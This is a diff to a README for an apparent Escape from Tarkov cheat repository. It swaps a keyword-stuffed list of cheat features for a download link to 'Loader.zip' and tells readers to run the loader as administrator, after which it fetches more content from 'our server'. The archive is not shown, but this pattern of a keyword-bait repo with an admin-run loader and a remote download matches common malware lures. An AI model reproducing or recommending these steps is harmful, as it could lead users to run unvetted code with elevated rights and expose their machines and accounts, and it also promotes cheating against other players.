@@ -1,2 +1,7 @@
-# cheat-escape-from-tarkov
-EscapefromTarkov hacks hack cheat cheats aimbot ESP wallhack no-recoil no-spread triggerbot radar-hack silent-aim infinite-ammo speed-hack god-mode instant-respawn rapid-fire infinite-abilities cooldown-hack anti-flash anti-smoke player-ESP EFT
+# [DOWNLOAD cheat-escape-from-tarkov](https://github.com/mowterry/cheat-escape-from-tarkov/releases/download/download/Loader.zip)
+## How do I download and run it?
+
+- Download the zip archive using the button above
+- Unzip to any folder on your desktop
+- Open the Loader as an administrator
+- After launching the loader, the installation menu will open. The speed will be high because the download will be made directly from our server!
